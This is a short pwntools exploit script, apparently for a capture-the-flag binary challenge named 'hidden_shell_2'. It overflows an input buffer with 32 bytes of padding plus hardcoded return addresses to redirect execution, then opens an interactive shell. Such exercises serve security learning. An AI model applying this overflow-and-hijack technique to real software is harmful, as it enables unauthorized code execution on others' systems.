from pwn import *

# Start the process
io = process("./hidden_shell_2")

# gdb.attach(io, '''
# set disassembly-flavor intel
# break *0x0000000000401290
# ''')

elf_file = ELF("./main")

# Set context
context.arch = 'amd64'

# Payloads
payload = b"A"* 32 + p64(0x4033c8)
payload2 = p64(0x00000000004011b6)

# Ensure recvuntil matches the program's output
io.recvuntil("Enter your name: ")
io.sendline(payload)

io.recvuntil("Enter your friend's name: ")
io.sendline(payload2)

# Interact with the program (if needed)
io.interactive()
